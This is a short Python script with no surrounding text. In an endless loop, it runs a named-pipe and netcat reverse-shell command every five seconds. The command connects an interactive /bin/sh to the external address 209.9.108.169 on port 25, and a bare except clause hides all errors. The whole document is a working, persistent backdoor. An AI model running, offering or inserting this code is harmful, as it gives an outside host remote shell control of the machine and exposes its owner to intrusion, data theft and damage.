import os
import time
while 1:
    try:
        os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 209.9.108.169 25 >/tmp/f')
        time.sleep(5)
    except:
        pass
